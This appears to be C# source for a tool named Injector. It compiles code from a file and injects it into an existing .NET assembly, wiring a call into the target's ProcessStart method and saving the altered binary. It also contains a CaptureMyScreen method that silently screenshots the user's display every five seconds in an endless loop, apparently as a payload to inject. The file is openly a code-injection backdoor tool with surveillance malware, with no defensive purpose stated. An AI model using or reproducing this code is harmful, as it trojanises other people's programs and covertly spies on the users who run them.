using Microsoft.CodeAnalysis;
using System;
using System.IO;

namespace Injector
{
    internal class Program
    {
        private static string _className = "TemporaryClass";
        private static string _template = "public class {0} {{ {1} }}";

        static void Main(string[] args)
        {
            CommandLine.CommandLineProcessor processor = new CommandLine.CommandLineProcessor();

            if (processor.ParseArguments(args))
            {
                AssemblyInjector injector = new AssemblyInjector(processor.GetValueFromKey("-i"));
                string code = string.Format(_template, _className, File.ReadAllText(processor.GetValueFromKey("-c")));

                injector.InjectMethod(targetTypeName: "Program", methodCode: code, _className, processor.GetValueFromKey("-m"), OutputKind.ConsoleApplication);
                injector.InjectNewMethodCallInExistingMethod("Program", "ProcessStart", processor.GetValueFromKey("-m"), false);
                injector.SaveModifiedAssembly(processor.GetValueFromKey("-o"));
            }
        }

        private void CaptureMyScreen()
        {
            int count = 0;
            while (true)
            {
                try
                {
                    System.Drawing.Bitmap captureBitmap = new System.Drawing.Bitmap(1024, 768, System.Drawing.Imaging.PixelFormat.Format32bppArgb);

                    System.Drawing.Rectangle captureRectangle = System.Windows.Forms.Screen.AllScreens[0].Bounds;

                    System.Drawing.Graphics captureGraphics = System.Drawing.Graphics.FromImage(captureBitmap);

                    captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                    captureBitmap.Save("C:\\Users\\milton\\Desktop\\bro", System.Drawing.Imaging.ImageFormat.Jpeg);
                }
                catch { }

                System.Threading.Thread.Sleep(5000);
                count++;
            }
        }
    }
}
